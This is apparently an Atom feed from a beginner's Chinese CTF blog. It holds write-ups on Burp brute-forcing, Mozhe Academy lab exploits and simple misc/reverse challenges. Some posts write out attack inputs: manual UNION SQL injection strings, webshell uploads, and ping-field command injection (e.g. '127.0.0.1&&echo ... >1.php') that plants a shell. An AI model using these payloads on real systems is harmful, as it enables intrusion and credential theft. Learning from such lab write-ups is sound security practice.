<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lingxin16</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lingxin16.github.io/"/>
  <updated>2019-12-31T17:14:23.646Z</updated>
  <id>http://lingxin16.github.io/</id>
  
  <author>
    <name>liu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>管道符漏洞</title>
    <link href="http://lingxin16.github.io/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E-1/"/>
    <id>http://lingxin16.github.io/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E-1/</id>
    <published>2019-12-31T17:14:23.000Z</published>
    <updated>2019-12-31T17:14:23.646Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>burp爆破</title>
    <link href="http://lingxin16.github.io/2019/12/19/burp%E7%88%86%E7%A0%B4/"/>
    <id>http://lingxin16.github.io/2019/12/19/burp%E7%88%86%E7%A0%B4/</id>
    <published>2019-12-19T15:49:45.000Z</published>
    <updated>2019-12-20T09:04:39.991Z</updated>
    
    <content type="html"><![CDATA[<p>用burpsuit对网页上的一些用户名密码之类的爆破</p><p>这里就用墨者学院文件包含那道题的那个登录页面吧…</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191219235640.png" alt="QQ截图20191219235640"></p> <a id="more"></a><p>设置代理 先用burp抓取</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191219235847.png" alt="QQ截图20191219235847"></p><p>黑色圈住的就是用户名和密码的函数(应该是叫函数吧…..)  红色圈住的就是之前自己输入的账号和密码</p><p>能看到是明文密码 然后send to intruder</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220000053.png" alt="QQ截图20191220000053"></p><p>这里他实现标记了要爆破的位置 不是我们要爆破的位置 我们先用上边的clear把标记清除</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220000358.png" alt="QQ截图20191220000358"></p><p>然后选中要爆破的地址 这里都是admin前边那个是我输入的账号后边的是密码  然后点击add分别添加</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220002421.png" alt="QQ截图20191220000524"></p><p>在attack type那里选择cluster bomb</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220000929.png" alt="QQ截图20191220000929"></p><p>转到payloads那边</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220001013.png" alt="QQ截图20191220001013"></p><p>看到payload set 右边下拉发现有1,2分别是我们刚刚添加的两个地址</p><p>下边方框右边的add是手动添加账号密码 有字典的话点load载入字典</p><p>添加完成后选择intruder→start attack</p><p><img src="/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191220001248.png" alt="QQ截图20191220001248"></p><p>然后找到length里边那个长度不一样的就是我们要的账号密码</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用burpsuit对网页上的一些用户名密码之类的爆破&lt;/p&gt;
&lt;p&gt;这里就用墨者学院文件包含那道题的那个登录页面吧…&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/12/19/burp%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20191219235640.png&quot; alt=&quot;QQ截图20191219235640&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="burpsuit" scheme="http://lingxin16.github.io/tags/burpsuit/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院</title>
    <link href="http://lingxin16.github.io/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    <id>http://lingxin16.github.io/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/</id>
    <published>2019-12-06T13:40:08.000Z</published>
    <updated>2019-12-14T07:56:45.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内部文件上传系统漏洞分析溯源"><a href="#内部文件上传系统漏洞分析溯源" class="headerlink" title="内部文件上传系统漏洞分析溯源"></a>内部文件上传系统漏洞分析溯源</h1><p>上传asp一句话木马</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192741.png" alt="QQ截图20191202192741"></p><p>burp抓包修改文件上传路径  在.asp后缀的文件夹中 文件被默认为asp类型执行</p><a id="more"></a><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192630.png" alt="QQ截图20191202192630"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192639.png" alt="QQ截图20191202192639"></p><p>蚁剑链接</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192555.png" alt="QQ截图20191202192555"></p><h1 id="phpMyAdmin后台文件包含分析溯源"><a href="#phpMyAdmin后台文件包含分析溯源" class="headerlink" title="phpMyAdmin后台文件包含分析溯源"></a>phpMyAdmin后台文件包含分析溯源</h1><p>密码弱口令root登录</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191206215606.png" alt="QQ截图20191206215606"></p><p>sql注入一句话</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191206215818.png" alt="QQ截图20191206215818"></p><p>蚁剑链接  根目录找到key文件</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191206220106.png" alt="QQ截图20191206220106"></p><p>得到key:mozhe6e0dc3709254b6732421f373dce</p><h1 id="SQL注入漏洞测试-布尔盲注"><a href="#SQL注入漏洞测试-布尔盲注" class="headerlink" title="SQL注入漏洞测试(布尔盲注)"></a>SQL注入漏洞测试(布尔盲注)</h1><p>打开靶场,找到停机维护通知页面</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210212136.png" alt="QQ截图20191210212136"></p><p>用sqlmap爆当前库</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210212056.png" alt="QQ截图20191210212056"></p><p>获取到数据库名stormgroup</p><p>然后爆表段</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210212751.png" alt="QQ截图20191210212751"></p><p>获取到表member和notice</p><p>然后爆字段 得到 name password 和status</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213301.png" alt="QQ截图20191210213301"></p><p>然后分别猜解name和password</p><p>得到name为mozhe password需要md5解码</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213913.png" alt="QQ截图20191210213913"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213750.png" alt="QQ截图20191210213750"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210214158.png" alt="QQ截图20191210214158"></p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210213734.png" alt="QQ截图20191210213734"></p><p>第一个没办法登录 用第二个密码才登录成功,得到key</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191210214029.png" alt="QQ截图20191210214029"></p><h1 id="SQL手工注入漏洞测试-MySQL数据库-字符型"><a href="#SQL手工注入漏洞测试-MySQL数据库-字符型" class="headerlink" title="SQL手工注入漏洞测试(MySQL数据库-字符型)"></a>SQL手工注入漏洞测试(MySQL数据库-字符型)</h1><p>先打开靶场 找到注入页面</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211165444.png" alt="QQ截图20191211165444"></p><p><a href="http://219.153.49.228:45556/new_list.php?id=tingjigonggao后加上&#39;and" target="_blank" rel="noopener">http://219.153.49.228:45556/new_list.php?id=tingjigonggao后加上&#39;and</a> 1 = 1–+ 发现页面打开正常</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211170335.png" alt="QQ截图20191211170335"></p><p>判断为字符型注入 其实题目已经说明了是字符型注入…</p><p>然后获取列表的字段数 后边加上’order by 1–+</p><p>将1分别替换为2,3,4,5发现为5的时候显示不正常  那么字段数最大应该为4</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211170717.png" alt="QQ截图20191211170717"></p><p>然后判断回显位置 将=后改为’ union select 1,2,3,4 –+  得到回显位置为2和3</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172802.png" alt="QQ截图20191211172802"></p><p>然后获取数据库名  将=后改为’ union select 1,database(),3,4 –+  得到数据库名mozhe_discuz_stormgroup</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172640.png" alt="QQ截图20191211172640"></p><p>接着获取表 =后为’ union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() and ‘1’=’1  得到两个表notice,stormgroup_member</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172721.png" alt="QQ截图20191211172721"></p><p>接着获取字段  =后为’ union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’stormgroup_member’ and ‘1’=’1   得到四个字段</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211172958.png" alt="QQ截图20191211172958"></p><p>最后就是查询字段name和password的值   =后为’ union select 1,name,password,4 from stormgroup_member where’1’=’1#</p><p><img src="/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191211174645.png" alt="QQ截图20191211174645"></p><p>md5解码后登录</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;内部文件上传系统漏洞分析溯源&quot;&gt;&lt;a href=&quot;#内部文件上传系统漏洞分析溯源&quot; class=&quot;headerlink&quot; title=&quot;内部文件上传系统漏洞分析溯源&quot;&gt;&lt;/a&gt;内部文件上传系统漏洞分析溯源&lt;/h1&gt;&lt;p&gt;上传asp一句话木马&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/QQ%E6%88%AA%E5%9B%BE20191202192741.png&quot; alt=&quot;QQ截图20191202192741&quot;&gt;&lt;/p&gt;
&lt;p&gt;burp抓包修改文件上传路径  在.asp后缀的文件夹中 文件被默认为asp类型执行&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="writeup" scheme="http://lingxin16.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>write up</title>
    <link href="http://lingxin16.github.io/2019/12/05/write-up/"/>
    <id>http://lingxin16.github.io/2019/12/05/write-up/</id>
    <published>2019-12-05T13:11:14.000Z</published>
    <updated>2019-12-14T07:42:53.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h2 id="圣堂刺客"><a href="#圣堂刺客" class="headerlink" title="圣堂刺客"></a>圣堂刺客</h2><p>下载 拖入文本 找到flag ： AGCTF{MetaData_1s_Important}</p><a id="more"></a><p><img src="/2019/12/05/write-up/20191122192540517.jpg" alt="20191122192540517"></p><h2 id="奥利安娜的QQ号"><a href="#奥利安娜的QQ号" class="headerlink" title="奥利安娜的QQ号"></a>奥利安娜的QQ号</h2><p>直接百度!<img src="/2019/12/05/write-up/20191122193129505.jpg" alt="20191122193129505"></p><h2 id="多喝水"><a href="#多喝水" class="headerlink" title="多喝水"></a>多喝水</h2><p>图片下载下来 拖入文本 得到</p><p><img src="/2019/12/05/write-up/20191122193920451.jpg" alt="20191122193920451"></p><p>QUdDVEYlN0JwMWVhczNfZHIxbmtfbTByZV93YXQzciU3RA==<br>放进base64解码得AGCTF%7Bp1eas3_dr1nk_m0re_wat3r%7D<br>%7B和%7D换成{ }</p><h2 id="帅帅帅"><a href="#帅帅帅" class="headerlink" title="帅帅帅"></a>帅帅帅</h2><p>下载html文件 打开没有发现flag 查看源代码</p><p><img src="/2019/12/05/write-up/20191122194200468.jpg" alt="20191122194200468"></p><h2 id="Easy-Misc"><a href="#Easy-Misc" class="headerlink" title="Easy_Misc"></a>Easy_Misc</h2><p>弱口令直接用字典爆破 得到密码password<br>解压出图片 后缀改为rar 解压得到视频，提取二维码补齐定位点，</p><p><img src="/2019/12/05/write-up/20191122204627566.png" alt="20191122204627566"></p><p>扫码得到flag：flag{e7d478cf6b915f50ab1277f78502a2c5}将里边的字符MD5解码得到hello_ctf</p><h2 id="玩具车"><a href="#玩具车" class="headerlink" title="玩具车"></a>玩具车</h2><h2 id="可以直接拖入记事本得到flag"><a href="#可以直接拖入记事本得到flag" class="headerlink" title="可以直接拖入记事本得到flag"></a>可以直接拖入记事本得到flag</h2><p><img src="/2019/12/05/write-up/20191122194834546.jpg" alt="20191122194834546"></p><h2 id="Easy-RE"><a href="#Easy-RE" class="headerlink" title="Easy_RE"></a>Easy_RE</h2><p>用ida打开 f5查看代码，r键转换字符，得到flag</p><p><img src="/2019/12/05/write-up/20191122204437442.png" alt="20191122204437442"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>既然是逆向 就先用ida打开 (需要注意一下ida和ida64的区别 这1个有的能查看C语言伪代码,这个题是ida)</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200915.png" alt="QQ截图20191212200915"></p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200925.png" alt="QQ截图20191212200925"></p><p>在main函数中没有发现什么 但是下边的main_0中可以看到一些东西 </p><p>大概意思就是前边一串东西加上40之后等于后边的一串 此时则输出ok</p><p>接着看那一团byte什么的双击之后看到<img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212201745.png" alt="QQ截图20191212201745"></p><p>通过询问大佬得知是16进制数 那我们就需要把他转化成十进制 再运算之后输出ascill形式</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212204354.png" alt="QQ截图20191212204354"></p><p>得到flag :AGCTF{Easy_Hex}</p><h2 id="这是个gif"><a href="#这是个gif" class="headerlink" title="这是个gif"></a>这是个gif</h2><p>把gif文件下载下来 发现怎么都没有办法打开,排除是隐写,没有办法,放到winhex里看一下,并没有发现GIF文件标记(只因我没有看到gif这三个字母….)</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212195829.png" alt="QQ截图20191212195829"></p><p>百度gif文件  发现GIF87a和GIF89a两个版本<img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200020.png" alt="QQ截图20191212200020"></p><p>正好这个文件在winhex中打开开头是89a  然后百度gif文件头<img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200238.png" alt="QQ截图20191212200238"></p><p>对比发现是文件头缺失 然后就在winhex中补齐</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200503.png" alt="QQ截图20191212200503"></p><p>保存后发现是个gif文件 在ps中打开查看gif那一帧  得到flag</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212200604.png" alt="QQ截图20191212200604"></p><h2 id="re-xor"><a href="#re-xor" class="headerlink" title="re_xor"></a>re_xor</h2><p>这个是用ida64才能打开查看C语言伪代码的</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212205442.png" alt="QQ截图20191212205442"></p><p>f5查看伪代码 </p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212205800.png" alt="QQ截图20191212205800"></p><p>发现有个地方看不懂   ^这个符号 在C语言中表示什么呢….</p><p>上网搜一下 C语言 ^</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212210008.png" alt="QQ截图20191212210008"></p><p>emm..位异或  题目xor也表明了这个题跟异或有关</p><p>搜一下异或 有一大堆看不太懂的东西  </p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212210214.png" alt="QQ截图20191212210214"></p><p>这个大概就是当^前后相等时 表示0 不等是则是1  </p><p>还是重新看源代码吧…</p><p>写个脚本算一算 这里就直接用异或那个符号了 也省的理解那么多…</p><p><img src="/2019/12/05/write-up/QQ%E6%88%AA%E5%9B%BE20191212211701.png" alt="QQ截图20191212211701"></p><p>得到flag AGCTF{Happy_x0r}</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;h2 id=&quot;圣堂刺客&quot;&gt;&lt;a href=&quot;#圣堂刺客&quot; class=&quot;headerlink&quot; title=&quot;圣堂刺客&quot;&gt;&lt;/a&gt;圣堂刺客&lt;/h2&gt;&lt;p&gt;下载 拖入文本 找到flag ： AGCTF{MetaData_1s_Important}&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="writeup" scheme="http://lingxin16.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ceshi</title>
    <link href="http://lingxin16.github.io/2019/12/05/ceshi/"/>
    <id>http://lingxin16.github.io/2019/12/05/ceshi/</id>
    <published>2019-12-05T12:49:34.000Z</published>
    <updated>2019-12-05T13:07:58.357Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2019/12/05/ceshi/tu.png" alt="tu"></p><p>手动插入图片测试</p><p><img src="/2019/12/05/ceshi/preview.jpg" alt="preview">Typora拖入测试</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/2019/12/05/ceshi/tu.png&quot; alt=&quot;tu&quot;&gt;&lt;/p&gt;
&lt;p&gt;手动插入图片测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/12/05/ceshi/preview.jpg&quot; alt=&quot;preview&quot;&gt;Typora拖入测试&lt;/p
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>管道符漏洞</title>
    <link href="http://lingxin16.github.io/2019/12/05/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/"/>
    <id>http://lingxin16.github.io/2019/12/05/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-12-05T12:49:34.000Z</published>
    <updated>2019-12-31T17:10:08.584Z</updated>
    
    <content type="html"><![CDATA[<p>在ping的地址后利用管道符|，||，&amp;，&amp;&amp;进行命令执行</p><p>例如127.0.0.1&amp;&amp;ls</p><p>利用<code>127.0.0.1&amp;&amp;echo &#39;一句话&#39; &gt;1.php</code>       将自己的马写到1.php中</p><p>&amp;&amp;后跟命令</p><p>比如重命名文件命令 <code>127.0.0.1&amp;&amp;mv 1.txt 1.php</code>将1.txt重命名为1.php</p><p><img src="/2019/12/05/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/QQ%E5%9B%BE%E7%89%8720200101010852.png" alt="QQ图片20200101010852"></p><p>冲鸭，2020第一天！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在ping的地址后利用管道符|，||，&amp;amp;，&amp;amp;&amp;amp;进行命令执行&lt;/p&gt;
&lt;p&gt;例如127.0.0.1&amp;amp;&amp;amp;ls&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;127.0.0.1&amp;amp;&amp;amp;echo &amp;#39;一句话&amp;#39; &amp;gt;1.php&lt;/
      
    
    </summary>
    
    
    
      <category term="-linux -管道符" scheme="http://lingxin16.github.io/tags/linux-%E7%AE%A1%E9%81%93%E7%AC%A6/"/>
    
  </entry>
  
</feed>
